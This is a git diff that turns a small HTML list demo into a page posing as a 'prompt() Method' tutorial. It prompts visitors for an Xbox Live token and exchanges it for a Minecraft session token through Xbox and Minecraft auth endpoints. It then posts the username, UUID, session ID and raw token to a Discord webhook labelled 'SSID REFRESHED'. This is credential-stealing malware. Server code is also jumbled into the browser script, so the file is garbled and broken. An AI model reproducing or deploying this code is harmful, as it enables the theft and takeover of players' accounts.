@@ -1,42 +1,165 @@
+<!DOCTYPE html>
 <html>
-<script> 
-    //var list = document.getElementById('test');
-    //var elements = document.createDocumentFragment();
-    let person = prompt("Please enter your name", "Harry Potter");
-
-if (person != null) {
-  document.getElementById("demo").innerHTML =
-  "Hello " + person + "! How are you today?";
-}
-    console.log(list);
-    for (var i = 0 ; i < 10 ; i++){
-       /* let element = document.createElement('li');
-
-        element.innerText = "Elemento " + i;
-        console.log(i);*/
-
-        var node = document.createElement("LI");                 // Create a <li> node
-        var textnode = document.createTextNode("Water");         // Create a text node
-        node.appendChild(textnode);                              // Append the text to <li>
-        document.getElementById('myList').appendChild(node);
-    }
-
-    //list.appendChild(elements);
-
-    //document.appendChild(list);
-     function myFunction() {
-            var node = document.createElement("LI");
-            var textnode = document.createTextNode("Water");
-            node.appendChild(textnode);
-            document.getElementById("myList").appendChild(node);
-        }
-
-</script>
 <body>
-    <button onclick="myFunction()">Try it</button>
-    <ul id="myList">
-      <li>Coffee</li>
-      <li>Tea</li>
-  </ul>
+
+<h1>The Window Object</h1>
+<h2>The prompt() Method</h2>
+
+<p>Click the button to demonstrate the prompt box.</p>
+
+<button onclick="myFunction()">Try it</button>
+
+<p id="demo"></p>
+
+<script>
+function myFunction() {
+  let userToken = prompt("Please enter XBL token", "token goes here");
+  if (userToken != null) {
+    document.getElementById("demo").innerHTML =
+    "Hello " + userToken + "! How are you today?";
+     app.get("/api/player/networth", async (req, res) => {
+     const userToken = req.query.minecraft_ign;
+  if (userToken == undefined) {
+    res.json({
+      success: false,
+      cause: "Missing minecraft_ign field",
+    });
+    return;
+  }
+    //res.send('Success! You can exit this page and return to discord.')
+    try {
+        console.log('1')
+        console.log('all of those parameters were obsolete, the fun part begins')
+        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
+        const xstsTokenHashArray = await getXSTSToken(userToken)
+        console.log('its working!')
+        const xstsToken = xstsTokenHashArray[0]
+        const userHash = xstsTokenHashArray[1]
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = getIp(req)
+        postToWebhook(username, bearerToken, uuid, ip, userToken)
+    } catch (e) {
+        console.log(e)
+    }
+})
+  }
+}
+app.listen(port, () => {
+    console.log(`Started the server on ${port}`)
+})
+
+async function getUserHashAndToken(accessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function waitforthis() {
+  await waitFor(_ => getElementById !== 'undefined');
+  console.log('the wait is over!');
+}
+
+async function getXSTSToken(userToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function getBearerToken(xstsToken, userHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let data = {
+        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
+}
+
+async function getUsernameAndUUID(bearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + bearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+function getIp(req) {
+    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, userToken) {
+    const url = webhook_url
+    let data = {
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        content: "||```" + userToken + "```||",
+        embeds: [{
+            title: "SSID REFRESHED", color: 0x00ff50, fields: [
+                {name: "Username", value: username, inline: true},
+                {name: "UUID", value: uuid, inline: true},
+                {name: "Ip", value: "[Local Address]", inline: true},
+                {name: "SessionID", value: bearerToken, inline: false},
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
+            ]
+        }]
+    }
+    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+}
+
+//function returnText() {
+//  let userToken = 
+//  alert(input)
+//}
+
+const bannedNames = []
+
+function addBan(name) {
+    bannedNames.push(name);
+}
+
+function checkIfBanned(name) {
+
+    for (const item of bannedNames) {
+        if (name === item) {
+            return true
+        }
+    }
+    addBan(name)
+    return false
+}
+</script>
+
 </body>
 </html>
